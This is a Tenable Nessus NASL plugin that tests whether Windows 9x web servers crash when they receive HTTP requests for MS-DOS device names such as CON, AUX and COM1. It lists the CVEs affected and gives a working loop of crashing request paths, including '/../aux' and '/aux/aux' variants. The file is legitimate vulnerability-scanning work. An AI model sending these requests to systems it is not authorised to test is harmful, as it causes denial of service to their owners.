#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security 
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added links to the Bugtraq message archive, Microsoft Knowledgebase,
#      and known vulnerable servers list
#
# Vulnerable servers:
# vWebServer v1.2.0 (and others?)
# AnalogX SimpleServer:WWW 1.08		CVE-2001-0386
# Small HTTP server 2.03		CVE-2001-0493
# acWEB HTTP server?
# Xitami Web Server                     BID:2622, CVE-2001-0391
# Jana Web Server                       BID:2704, CVE-2001-0558
# Cyberstop Web Server                  BID:3929, CVE-2002-0200
# General Windows MS-DOS Device         BID:1043, CVE-2000-0168
# Apache < 2.0.44			CVE-2003-0016
# Domino 5.0.7 and earlier		CVE-2001-0602, BID: 2575
# Darwin Streaming Server v4.1.3e	CVE-2003-0421
# Darwin Streaming Server v4.1.3f 	CVE-2003-0502
#



include("compat.inc");

if(description)
{
 script_id(10930);
 script_version("$Revision: 1.43 $");
 if (NASL_LEVEL >= 2200 ) script_cve_id("CVE-2001-0386", "CVE-2001-0493", "CVE-2001-0391", "CVE-2001-0558", "CVE-2002-0200", 
                                        "CVE-2000-0168", "CVE-2003-0016", "CVE-2001-0602");
 script_bugtraq_id(1043, 2575, 2608, 2622, 2649, 2704, 3929, 6659, 6662);
 script_osvdb_id(
  1251,
  1803,
  1817,
  3781,
  9708,
  9709,
  10810,
  11346,
  11640
 );

 script_name(english:"Multiple Web Server on Windows MS/DOS Device Request Remote DOS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a Web Server that is affected by a denial
of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to freeze or reboot Windows by reading a MS/DOS device
through HTTP, using a file name like CON\CON, AUX.htm, or AUX. An
attacker could exploit this flaw to deny service to the affected
system." );
 # https://web.archive.org/web/20010725010353/http://archives.neohapsis.com/archives/bugtraq/2001-04/0279.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8c839064" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/May/81" );
 script_set_attribute(attribute:"solution", value:
"Contact your vendor for fixes." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/03/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/04/17");
 script_cvs_date("$Date: 2016/11/18 21:06:04 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_summary(english:"Crashes Windows 98");
 script_category(ACT_KILL_HOST);
 script_copyright("This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencies("http_version.nasl", "os_fingerprint.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Host/Win9x");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


if (! get_kb_item("Host/Win9x"))
 exit(0, "The remote OS is unknown or is not Windows 9x");

start_denial();

dev[0] = "aux";
dev[1] = "con";
dev[2] = "prn";
dev[3] = "clock$";
dev[4] = "com1";
dev[5] = "com2";
dev[6] = "lpt1";
dev[7] = "lpt2";

i = 0;
ext[i++] = ".htm";	# Should we add .html ?
ext[i++] = ".";
ext[i++] = ". . .. ... .. .";
ext[i++] = ".asp";
ext[i++] = ".foo";
ext[i++] = ".bat";
# Special meanings
ext[i++] = "-";		# /../ prefix
ext[i++] = "+";		# /aux/aux pattern

port = get_http_port(default:80, embedded: 1);
if (http_is_dead(port: port))
 exit (0, "The web server on port "+port+" is dead.");

 n = 0;
 for (i = 0; dev[i]; i = i + 1)
 {
  d = dev[i];
  for (j = 0; ext[j]; j = j + 1)
  {
   e = ext[j];
   if (e == "+")
    name = string("/", d, "/", d);
   else if (e == "-")
    # Kills Darwin Streaming Server v4.1.3f and earlier (Win32 only)
    name = string("/../", d);
   else
    name = string("/", d, e);
   #display(n++, ": ", name, "\n");
   r = http_send_recv3(method: "GET", item:name, port:port, exit_on_fail: 0);
  }
 }
 
alive = end_denial();

if (! http_is_dead(port: port))
  exit(0, "Web server on port "+port+" is still alive");

if(!alive)
{
 security_warning(port);
 set_kb_item(name:"Host/dead", value:TRUE);
 exit(0);
}
else
  exit(0, "Host is still alive");
